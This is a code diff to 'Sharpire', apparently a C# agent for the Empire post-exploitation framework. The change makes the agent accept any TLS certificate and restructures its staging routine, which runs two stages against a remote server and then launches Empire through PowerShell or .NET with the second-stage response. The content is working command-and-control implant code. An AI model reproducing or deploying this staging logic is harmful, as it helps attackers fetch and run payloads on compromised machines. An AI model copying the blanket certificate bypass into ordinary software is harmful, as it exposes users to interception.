@@ -7,6 +7,7 @@ using System.Management;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Net;
+using System.Net.Security;
 using System.Diagnostics;
 using System.Security;
 using System.Security.Cryptography;
@@ -52,28 +53,55 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         public void execute()
         {
+            byte[] stage1response;
+            byte[] stage2response;
+            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback( 
+                delegate
+                {
+                    return true;
+                }
+           );
+
             try
             {
-                byte[] stage1response = stage1();
-                Console.WriteLine("Stage1 Complete");
+                try
+                {
+                    stage1response = stage1();
+                    Console.WriteLine("Stage1 Complete");
+                    try
+                    {
+                        stage2response = stage2(stage1response);
+                        Console.WriteLine("Stage2 Complete");
+                        try
+                        {
+                            Console.WriteLine("Launching Empire");
+                            if (language == "powershell" || language == "ps" || language == "posh")
+                            {
+                                powershellEmpire(stage2response);
+                            }
+                            else if (language == "dotnet" || language == "net" || language == "clr")
+                            {
+                                dotNetEmpire();
+                            }
+                        }
+                        catch
+                        {
+                            Console.WriteLine("Empire Failure");
+                            throw;
+                        }
+                    }
+                    catch
+                    {
+                        Console.WriteLine("Stage2 Failure");
+                        throw;
+                    }
+                }
+                catch (Exception exception)
+                {
+                    Console.WriteLine("Stage1 Failure");
+                    throw;
+                }
 
-                byte[] stage2response = stage2(stage1response);
-                Console.WriteLine("Stage2 Complete");
-
-                Console.WriteLine("Launching Empire");
-                if (language == "powershell" || language == "ps" || language == "posh")
-                {
-                    powershellEmpire(stage2response);
-                }
-                else if (language == "dotnet" || language == "net" || language == "clr")
-                {
-                    dotNetEmpire();
-                }
-                else
-                {
-                    //powershellEmpire(stage2response);
-                    //Something else to give me a headache in the future
-                }
             }
             catch (WebException webError)
             {
